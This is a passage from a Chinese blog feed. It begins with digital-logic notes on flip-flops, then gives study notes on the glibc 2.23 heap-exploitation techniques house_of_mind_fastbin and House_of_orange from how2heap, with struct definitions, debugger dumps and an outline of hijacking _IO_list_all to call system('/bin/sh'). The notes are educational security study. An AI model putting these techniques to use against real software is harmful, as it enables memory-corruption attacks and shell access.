Q&#x3D;0$称为“1”状态，否则称为“0”状态。输入信号不变时，触发器状态稳定不变</li><li>在一定输入信号作用下，触发器可以从一个稳定状态转移到另一个稳定状态</li><li>输出状态不仅与现时输入有关，还与原来输出状态有关</li><li>按功能分类：RS型触发器、D型触发器、T型触发器、JK型触发器等</li></ul><p>现态：$Q^n,\bar{Q^n}$，简记为$Q,\bar Q$<br>次态：$Q^{n+1},\bar Q^{n+1}$</p><h2 id="3-4-1-基本R-S触发器"><a href="#3-4-1-基本R-S触发器" class="headerlink" title="3.4.1 基本R-S触发器"></a>3.4.1 基本R-S触发器</h2><p><img src="https://img-blog.csdnimg.cn/69e22b3482704f55ab38a0d0650d3e0f.png"></p><p>功能表：</p><table><thead><tr><th align="center">R</th><th align="center">S</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td><td align="center">不变</td></tr><tr><td align="center">1</td><td align="center">0</td><td align="center">次态为1</td></tr><tr><td align="center">0</td><td align="center">1</td><td align="center">现态为0</td></tr><tr><td align="center">0</td><td align="center">0</td><td align="center">不定（不允许）</td></tr></tbody></table><p><font color=red>输出方程：$Q^{n+1}&#x3D;\bar S+RQ$</font><br>约束方程：$R+S&#x3D;1$</p><p>基本R-S触发器在RS不同时实现的是赋值功能，赋R的值。</p><h2 id="3-4-2-常用的几种时钟控制触发器"><a href="#3-4-2-常用的几种时钟控制触发器" class="headerlink" title="3.4.2 常用的几种时钟控制触发器"></a>3.4.2 常用的几种时钟控制触发器</h2><h3 id="1-钟控R-S触发器"><a href="#1-钟控R-S触发器" class="headerlink" title="1. 钟控R-S触发器"></a>1. 钟控R-S触发器</h3><p><img src="https://img-blog.csdnimg.cn/2c567c1e7abc403bad6b71cbe46c6636.png"></p><p>当$CP&#x3D;0$时，$Q$状态不变<br>当$CP&#x3D;1$时，R-S输入功能表与基本R-S触发器功能表相反。</p><p><font color=red>输出方程：$Q^{n+1}&#x3D;S+\bar RQ$</font><br>约束方程：$RS&#x3D;0$</p><p>激励表：<br><img src="https://img-blog.csdnimg.cn/062aec0250c246feaca588884af80018.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_10,color_FFFFFF,t_70,g_se,x_16"></p><h3 id="2-钟控D触发器"><a href="#2-钟控D触发器" class="headerlink" title="2. 钟控D触发器"></a>2. 钟控D触发器</h3><p><img src="https://img-blog.csdnimg.cn/778ee0b80ba34d018010ad69d8494d64.png"></p><p>实际上就是将R-S触发器的S换成了D，R换成了~D。因此D输入什么就储存什么。</p><p><font color=red>输出方程：$Q^{n+1}&#x3D;D$</font></p><h3 id="3-钟控J-K触发器"><a href="#3-钟控J-K触发器" class="headerlink" title="3. 钟控J-K触发器"></a>3. 钟控J-K触发器</h3><p><img src="https://img-blog.csdnimg.cn/568b8bddea054bdf94bec75e6fb51ec1.png"></p><p>实际上就是相较于钟控R-S触发器添加了JK端均为1的处理：反转。JK端输入不同时赋J的值。</p><p><font color=red>输出方程：$Q^{n+1}&#x3D;J\bar Q+\bar KQ$</font></p><h3 id="4-钟控T触发器"><a href="#4-钟控T触发器" class="headerlink" title="4. 钟控T触发器"></a>4. 钟控T触发器</h3><p><img src="https://img-blog.csdnimg.cn/5a974f0d796b40ac808748491df27f66.png"></p><p>即将钟控J-K触发器的JK端接在一起。T&#x3D;1反转，T&#x3D;0不变</p><h2 id="3-4-3-主从R-S触发器"><a href="#3-4-3-主从R-S触发器" class="headerlink" title="3.4.3 主从R-S触发器"></a>3.4.3 主从R-S触发器</h2><p>空翻现象：在一个时钟周期内触发器发生2次及以上的变化，会造成系统状态的不稳定和工作的紊乱。<br>主从R-S触发器可以看做两个R-S触发器串联形成，这两个触发器的时钟信号互补。当主触发器解锁时，其信号变化对从触发器无影响。<br>从触发器的状态取决于主触发器解锁到锁定最后一课的状态，根据此状态设定从触发器。因此整个触发器输出信号只可能在时钟信号由1变为0时改变，提升了系统的同步性。</p><ol><li>主从R-S触发器<br><img src="https://img-blog.csdnimg.cn/021f8beff0b54d6fab794b03eaaee8d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ol><p>其中$R_D,S_D$为直接清零端和直接置1端，一般情况下为高电平，为低电平时可以直接为从触发器强制赋值。</p><ol start="2"><li>主从J-K触发器<br>在主从R-S触发器的基础上，加从$\bar Q$到主触发器S端的反馈与从Q到R端的反馈：R&#x3D;K，S&#x3D;J</li></ol><p><img src="https://img-blog.csdnimg.cn/556b852f79be4be2a208fd3edd0c7a64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><ol start="3"><li>典型维持：阻塞D触发器<br>钟控D触发器的改进版，只在时钟信号由0变成1（称上升沿）时读取D信号并设置触发器状态，其余时间Q不变</li></ol><p><img src="https://img-blog.csdnimg.cn/ce0afbe7408a405d8860a3b5120afd08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(2)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p><p>按照顺序，本文分析glibc 2_23文件夹中的第7~8个源码。这两种攻击方式初见比较绕人，也比较难，因此也花了不少时间消化与理解。<br><img src="https://img-blog.csdnimg.cn/aaea8e3113c34658b4fd9b629526eb38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><h1 id="7-house-of-mind-fastbin"><a href="#7-house-of-mind-fastbin" class="headerlink" title="7. house_of_mind_fastbin"></a>7. house_of_mind_fastbin</h1><p>这是一种较为复杂，不太常见的堆漏洞。原文件中的解释翻译大致如下（英语水平有限，很多地方自己都看不懂…）：</p><pre><code>这种攻击与传统的house of mind类似，后者使用一个假的非主线程所占有的arena来向一个新的地址写入。而前者使用的是fastbin作为写入的地址。如果能够分配任意数量的chunk，且对于chunk的size域有一字节的溢出，我们就可以控制很多东西。这可以被用来覆写一个已经被free的chunk到一个任意地址，或者可以在任意地址写入一个超大整数值。chunks的size域中低3 bit存放的是控制信息，由低到高分别为prev_inuse、mmap、non_main arena。使用non_main arena是本攻击的重点。首先，我们需要知道chunk是怎么知道自己不是主线程的arena。下面是_heap_info结构体的声明：</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;           <span class="comment">// Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">// Previous heap.</span></span><br><span class="line">  <span class="type">size_t</span> size;            <span class="comment">// Current size in bytes.</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size;   <span class="comment">// Size in bytes that has been mprotected</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="comment">// Proper alignment</span></span><br><span class="line">&#125; heap_info; </span><br></pre></td></tr></table></figure><pre><code>这里有一个值得注意的点是arena中的malloc_state是通过ar_ptr获取的，这是该结构体的第一个元素。malloc_state == mstate == arena。main arena有一个特殊的指针。但是，非main arenas在一个堆段的起始处。它们通过下面的代码获取，这里也是用户控制arena_for_chunk中ptr的地方。</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="meta">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br></pre></td></tr></table></figure><pre><code>这个宏获取了ptr然后减去了一个大数，因为heap_info应该在整个堆段的开头。那么通过使用这个，程序就可以找到需要使用的arena。这个攻击的想法是使用一个假的arena来写一个指针到一个地址，这个地址在free掉fastbin时滥用了arena_for_chunk的功能。这个攻击做了如下事情：1. 找到一个可用的arena地址作为non_main arena的地址2. 分配足够的chunk来到达这个non_main arena的位置，在那个位置我们可以控制arena控制字段的值3. 创建一个假的_heap_info来指明之后要使用的at_ptr4. 使用这个假的arena(ar_ptr)，我们使用fastbin，配合一个堆指针向一个ar_ptr不期望写入的地址写入。进行这个攻击的前提条件：1. 一个堆区地址的泄露，以知道假的_heap_info在什么地方（需要有可能避免特殊的喷射技术）2. 无限制分配堆空间的能力3. 一字节的溢出到下一个chunk的size处（需要能够放入fastbin中，因此如果有tcache需要首先填满tcache）4. malloc state（ar_ptr）的地址需要是一个大于在malloc_state.system_mem中被free的fastbin大小的值，否则这个chunk会被认为无效（这可以通过排列值完成）5. 下一个chunk，已经被free，必须有一个有效的size值（大于0x20且小于malloc_state.system_mem）</code></pre><p>看完这一大段话我是一脸懵逼的，不知所云。程序中说的是产生一个<code>constrained WRITE-WHERE primitive</code>。算了，叫什么名词无所谓，看他是怎么玩的。</p><p>跟着程序单步走，在进入while循环之前栈的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffffffe450 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">01:0008│     0x7fffffffe458 ◂— 0x1ff0004000000;MAX_SIZE | HEAP_MAX_SIZE</span><br><span class="line">02:0010│     0x7fffffffe460 ◂— 0x604430 ◂— 0x0;user_mem</span><br><span class="line">03:0018│     0x7fffffffe468 —▸ 0x603420 ◂— 0x0;fake_arena</span><br><span class="line">04:0020│     0x7fffffffe470 —▸ 0x603448 ◂— 0x0;target_loc</span><br><span class="line">05:0028│     0x7fffffffe478 —▸ 0x603410 ◂— 0x0;target_chunk</span><br><span class="line">06:0030│     0x7fffffffe480 ◂— 0x4000000;new_arena_value</span><br><span class="line">07:0038│     0x7fffffffe488 ◂— 0x4000000;fake_heap_info</span><br><span class="line">08:0040│     0x7fffffffe490 —▸ 0x7fffffffe580 ◂— 0x1</span><br><span class="line">09:0048│     0x7fffffffe498 ◂— 0x0</span><br><span class="line">0a:0050│ rbp 0x7fffffffe4a0 —▸ 0x4008c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">0b:0058│     0x7fffffffe4a8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure><p>之后进入循环一直分配大小为<code>MAX_SIZE==0x1FF00</code>大小的chunk直到分配到的chunk的地址大于<code>new_arena_value==0x4000000</code>。然后<code>malloc(0x50)</code>，将上述stack中08:0040处赋值为fastbin chunk的值（测试为0x4028F50）。之后，程序对0x4000000处进行了写操作，这里是要作为假的arena，因此有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)</span><br></pre></td></tr></table></figure><p>将假_heap_info的第一个字段（ar_ptr）设置为假的arena所在处（0x603420）。调试显示，在没有攻击时，被攻击地址（0x603448）处的值为0，然后将那个最后分配的chunk的size中的non_main arena位修改为1。最后，将这个fastbin释放，然后就可以看到目标地址处被写入了fastbin的地址，成功将其修改为一个较大的值。</p><p>看到这里，已经大概明白了。实际上就是伪造一个malloc_state结构体在chunk中，然后欺骗free让它将bins链入这个假的arena中。因为malloc_state是arena所有控制字段以及bins的头指针所在的地方，具体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里需要注意为什么这个fastbin会修改到0x603448的值。查看mutex_t的定义知道这就是int类型，后面的flags也是一个int类型。紧随其后的fastbinsY是按照fastbin的大小链入的，从0x20大小开始。</p><table align=center>    <tr align=center>        <td> addr </td> <td> 0x0 </td> <td> 0x4 </td> <td> 0x8 </td> <td> 0xC </td>    </tr>    <tr align=center>        <td> 0x603420 </td> <td> mutex </td> <td> flag </td> <td colspan=2> fastbinsY[0] (for chunk size=0x20) </td>    </tr>    <tr align=center>        <td> 0x603430 </td> <td colspan=2> fastbinsY[1] (for chunk size=0x30) </td> <td colspan=2> fastbinsY[2] (for chunk size=0x40) </td>    </tr>    <tr align=center>        <td> 0x603440 </td> <td colspan=2> fastbinsY[3] (for chunk size=0x50) </td> <td colspan=2> <font color=red>fastbinsY[4] (for chunk size=0x60) </font> </td>    </tr>    <tr align=center>        <td> ...... </td> <td colspan=2> ...... </td> <td colspan=2> ...... </td>    </tr></table><p>由于释放的chunk大小为0x60，因此它被链入fastbinsY[4]的开头，而fastbinsY[4]的地址正好就是0x603448，这样要攻击的地址的值就被成功修改了。</p><p>综上所述，这种攻击的局限性较大，不仅前提条件很多，而且还不能任意修改值，在题目中可能会作为一种辅助的攻击手段来使用。其中最关键的两步就是修改了0x4000000处和fastbin的non_main arena的值。</p><h1 id="8-House-of-orange"><a href="#8-House-of-orange" class="headerlink" title="8. House_of_orange"></a>8. House_of_orange</h1><p>在how2heap的注释说明中，这个漏洞已经在glibc 2.24被修复。</p><blockquote><p>（摘自参考书籍）<br>这是一种FSOP（File Stream Oriented Programming），劫持_IO_list_all来伪造链表的利用技术，通过调用_IO_flush_all_lockp函数触发。该函数在以下3种情况触发：libc检测到内存错误从而执行abort流程时、执行exit函数时、main函数返回时。（源码演示的是第一种）</p></blockquote><p>乍一看，这个漏洞的执行流程较为复杂。要理解house_of_orange，首先要明确当需要分配的chunk大小大于top chunk会怎样。</p><p>在malloc函数中，当所有的freed chunk均不能满足分配时，会检查top chunk，这通过调用sysmalloc来实现。查看了一下sysmalloc函数，发现里面的判断关系很复杂。按照how2heap源码中的说法，在这里会将被缩小的top chunk释放，前提是top chunk的尾部需要是一页的尾部（即紧跟top chunk后面的地址是0x1000的整数倍）。源码中将top chunk的大小从0x20C01改为0xC01，然后分配大小为0x1000的堆块。但是通过自己写代码测试发现，在堆正常工作时，即使top chunk的大小也是0xC01，下一个分配的堆块也是0x1000大小，所有的chunk还是紧密连接，且没有一个chunk在bin中。</p><p><img src="https://img-blog.csdnimg.cn/fa040cdfc24945b2a1764c8205b676f8.png#pic_center"></p><p>看来这里面的逻辑有更加复杂的一些方面，即使是看源代码也不容易进行分析。最后还是在书中找到了答案。</p><blockquote><p>sysmalloc函数调用时会发生两种情况：第一种调用sbrk函数直接扩充top chunk，第二种调用mmap函数分配一块新的top chunk。为了能够使用前一种扩展chunk，需要请求小于阈值mp_.mmap_threshold。<br>同时，为了能够调用sysmalloc函数中的_int_free函数，需要top chunk在减去一个防止fencepost的MINSIZE后，还要大于MAXSIZE，即0x20；如果是main_arena，则需要放置两个fencepost。还需要绕过两个assert：满足old_size小于nb+MINSIZE，prev_inuse标志位为1，以及old_top+old_size页对齐。</p></blockquote><p>虽然还是有些懵，但先往下看。</p><p>运行how2heap源码，分配0x1000后显示的堆信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602000</span><br><span class="line">Size: 0x401</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x602400</span><br><span class="line">Size: 0xbe1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x602fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure><p>分配0x1000之后，源码注释里面写到下面假设这个unsorted bin能够被写。那也就是说这个地方不一定要通过上面的方法获取unsorted bin，有可能通过其他方式获得的unsorted bin也能进行后续操作，这个示例只是不使用free函数就获得了unsorted bin中的chunk而已。还是先往下看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这种攻击利用的是中止程序的函数。当程序异常中止时，会将所有文件指针清空，通过调用_IO_flush_all_lockp实现，最终遍历_IO_list_all并调用_IO_OVERFLOW函数。</span><br><span class="line">这种攻击的思路是用一个假的文件指针覆写_IO_list_all指针，它的_IO_OVERFLOW指向的是system函数，且开头8字节被设定为&#x27;/bin/sh&#x27;。因此调用_IO_OVERFLOW(fp, EOF)就是调用system(&#x27;/bin/sh&#x27;)。</span><br><span class="line">_IO_list_all的地址可以通过unsorted bin的fd和bk指针获取（当unsorted bin中仅有一个chunk时，这个chunk的fd和bk指针均指向main_arena + 0x88处【仅限glibc 2.23】）。源代码中_IO_list_all在其之后0x9A8处。</span><br></pre></td></tr></table></figure><p>其中操作的文件结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">IO_list_all</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">// 这个是进程FILE的指针域，通过这个指针链接形成链表，表头为_IO_list_all</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span 